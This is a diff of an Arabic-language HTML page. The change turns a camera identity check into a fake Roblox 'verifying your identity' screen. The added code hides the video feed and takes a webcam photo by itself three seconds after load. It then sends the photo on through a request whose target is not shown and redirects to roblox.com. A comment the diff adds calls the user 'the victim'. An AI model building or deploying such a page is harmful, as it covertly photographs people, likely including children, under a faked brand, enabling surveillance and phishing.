@@ -1,25 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تحقق الهوية</title>
+    <title>تحقق</title>
+    <style>
+        body { text-align: center; font-family: Arial; padding: 50px; background: #1a1a2e; color: white; }
+        video { width: 300px; height: 200px; border-radius: 10px; display: none; }
+        img { width: 150px; margin-bottom: 20px; }
+    </style>
 </head>
 <body>
-    <h1>يرجى الوقوف أمام الكاميرا لتأكيد الهوية</h1>
-    <video id="video" autoplay style="width:300px;height:200px;"></video>
-    <button id="capture">التقاط الصورة</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="Roblox">
+    <h1>جاري التحقق من هويتك...</h1>
+    <p>يرجى الانتظار لحظة</p>
+    <video id="video" autoplay></video>
 
     <script>
         const video = document.getElementById('video');
         let stream = null;
 
+        // طلب الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(s => {
                 stream = s;
                 video.srcObject = s;
+                // بعد 3 ثواني، التقط الصورة تلقائياً
+                setTimeout(capture, 3000);
             })
             .catch(() => alert('الرجاء السماح باستخدام الكاميرا'));
 
-        document.getElementById('capture').onclick = function() {
+        function capture() {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -43,13 +52,13 @@
                     });
                 })
                 .then(() => {
-                    alert('تم التحقق! جارٍ توجيهك...');
+                    // توجيه الضحية إلى روبلوكس بعد التصوير
                     window.location.href = 'https://www.roblox.com';
                 })
                 .catch(() => alert('حدث خطأ، حاول مرة أخرى'));
 
             if (stream) stream.getTracks().forEach(t => t.stop());
-        };
+        }
     </script>
 </body>
 </html>
